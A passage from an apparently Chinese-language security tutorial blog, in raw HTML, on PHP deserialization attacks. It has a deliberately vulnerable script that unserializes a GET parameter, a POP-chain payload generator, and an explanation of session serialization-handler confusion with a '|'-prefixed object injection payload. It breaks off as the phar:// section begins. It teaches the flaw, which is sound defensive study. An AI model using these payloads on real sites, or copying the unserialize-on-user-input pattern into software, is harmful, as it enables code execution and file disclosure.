class=&#34;line&#34;&gt;            $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Test&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;p = array();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __get($key)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $function = $this-&amp;gt;p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return $function();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(isset($_GET[&amp;#x27;pop&amp;#x27;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @unserialize($_GET[&amp;#x27;pop&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $a=new Show;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Modifier &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    protected  $var = &amp;quot;D://1.txt&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Show&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $source;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $str;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __construct($file=&amp;#x27;index.php&amp;#x27;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;source = $file;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;#x27;Welcome to &amp;#x27;.$this-&amp;gt;source.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Test&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public $p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;p = new Modifier();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a = new Show();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a-&amp;gt;source = $a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a-&amp;gt;str = new Test();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo urlencode(serialize($a));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;后面两个例子其实都是一样，原理懒的分析了～&lt;/p&gt;
&lt;h4 id=&#34;php_session-反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php_session-反序列化&#34;&gt;#&lt;/a&gt; PHP_session 反序列化&lt;/h4&gt;
&lt;p&gt;当第一次访问网站时，Seesion_start () 函数就会创建一个唯一的 Session ID，并自动通过 HTTP 的响应头，将这个 Session ID 保存到客户端 Cookie 中。同时，也在服务器端创建一个以 Session ID 命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过 HTTP 的请求头将 Cookie 中保存的 Seesion ID 再携带过来，这时 Session_start () 函数就不会再去分配一个新的 Session ID，而是在服务器的硬盘中去寻找和这个 Session ID 同名的 Session 文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;session_start 的作用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当会话自动开始或者通过 session_start () 手动开始的时候， PHP 内部会依据客户端传来的 PHPSESSID 来获取现有的对应的会话数据（即 session 文件）， PHP 会自动反序列化 session 文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为 sess_PHPSESSID (客户端传来的) 的文件。如果客户端未发送 PHPSESSID，则创建一个由 32 个字母组成的 PHPSESSID，并返回 set-cookie。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Session 存储机制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PHP 中的 Session 中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 session.save_handler 来进行确定的，默认是以文件的方式存储。存储的文件是以 sess_sessionid 来进行命名的，文件的内容就是 Session 值的序列化之后的内容。&lt;/p&gt;
&lt;p&gt;先来大概了解一下 PHP Session 在 php.ini 中主要存在以下配置项：&lt;/p&gt;
&lt;p&gt;在 PHP 中 Session 有三种序列化的方式，分别是 php，php_serialize，php_binary，不同的引擎所对应的 Session 的存储的方式不同&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;存储引擎&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;存储方式&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;php_binary&lt;/td&gt;
&lt;td&gt;键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;php&lt;/td&gt;
&lt;td&gt;键名 + 竖线 + 经过 serialize () 函数序列处理的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;php_serialize&lt;/td&gt;
&lt;td&gt;(PHP&amp;gt;5.5.4) 经过 serialize () 函数序列化处理的数组&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;username|s:5:&amp;quot;aaaaa&amp;quot;;    //php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;usernames:5:&amp;quot;bbbbb&amp;quot;;    //php_binary,最前面为ASCII中的不可见字符&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a:1:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:5:&amp;quot;bbbbb&amp;quot;;&amp;#125;    //php_serialize&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;Session 反序列化漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PHP 在 session 存储和读取时，都会有一个序列化和反序列化的过程，PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，PHP 中的 Session 的实现是没有的问题的，&lt;strong&gt;漏洞主要是由于使用不同的引擎来处理 session 文件造成的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;存在对 $_SESSION 变量赋值&lt;/p&gt;
&lt;p&gt;漏洞的主要原因在于不同的引擎对于竖杠’ | &#39; 的解析产生歧义。&lt;/p&gt;
&lt;p&gt;对于 php_serialize 引擎来说’ | ‘可能只是一个正常的字符；但对于 php 引擎来说’ | ‘就是分隔符，前面是 $_SESSION [‘username’] 的键名 ，后面是 GET 参数经过 serialize 序列化后的值。从而在解析的时候造成了歧义，导致其在解析 Session 文件时直接对’ | &#39; 后的值进行反序列化处理。&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;p&gt;先使用 php_serialize 引擎来存储 Session，在使用 php 引擎读取 session&lt;/p&gt;
&lt;p&gt;Session1.php&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ini_set(&amp;#x27;session.serialize_handler&amp;#x27;,&amp;#x27;php_serialize&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;session_start();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_SESSION[&amp;#x27;username&amp;#x27;] = $_GET[&amp;#x27;user&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var_dump($_SESSION);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来使用 php 引擎来读取 Session 文件&lt;/p&gt;
&lt;p&gt;Session2.php&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ini_set(&amp;#x27;session.serialize_handler&amp;#x27;,&amp;#x27;php&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;session_start();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class user&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var $name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var $age;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function __wakeup()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;quot;hello &amp;quot;.$this-&amp;gt;name.&amp;quot; !&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;当会话自动开始或者通过 &lt;strong&gt;session_start()&lt;/strong&gt; 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uc2Vzc2lvbi1zZXQtc2F2ZS1oYW5kbGVyLnBocA==&#34;&gt;session_set_save_handler()&lt;/span&gt; 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可以看到 PHP 能自动反序列化数据的前提是，现有的会话数据是以特殊的序列化格式存储。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//那么上一个例子的payload是：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class user&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        var $name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        var $age;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $a = new user();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $a-&amp;gt;name = &amp;quot;bmjoker&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $a-&amp;gt;age = &amp;quot;888&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo serialize($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:4:&amp;quot;user&amp;quot;:2:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:7:&amp;quot;bmjoker&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:3:&amp;quot;888&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;我们只需要在前面加个|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|O:4:&amp;quot;user&amp;quot;:2:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:7:&amp;quot;bmjoker&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:3:&amp;quot;888&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;此时session中的username的值为&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|O:4:&amp;quot;user&amp;quot;:2:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:7:&amp;quot;bmjoker&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:3:&amp;quot;888&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;使用php引擎读取时&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|后面的全部会变成value值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;就可以出发__wakeup魔法方法&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但这种方法是在可以对&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;I&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mtext&gt;进行赋值的情况下实现的，那如果代码中不存在对&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_SESSION进行赋值的情况下实现的，那如果代码中不存在对&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07847em;&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;进&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;行&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;赋&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;值&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;情&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;况&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;下&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;实&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;现&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;那&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;如&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;果&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;代&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;码&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;中&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;不&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;存&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;在&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;对&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_SESSION 变量赋值的情况下又该如何利用？&lt;/p&gt;
&lt;p&gt;在 PHP 中还存在一个 upload_process 机制，即自动在 $_SESSION 中创建一个键值对（key:value），value 中刚好存在用户可控的部分，可以看下官方描述的，这个功能在文件上传的过程中利用 session 实时返回上传的进度。&lt;/p&gt;
&lt;h4 id=&#34;phar伪协议触发php反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phar伪协议触发php反序列化&#34;&gt;#&lt;/a&gt; phar 伪协议触发 php 反序列化&lt;/h4&gt;
&lt;p&gt;通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入 unserialize ()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的 Black Hat 上提出利用 phar 文件会以序列化的形式存储用户自定义的 meta-data 这一特性，拓展了 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;phar 介绍和漏洞原理&lt;/strong&gt;&lt;/p&gt;
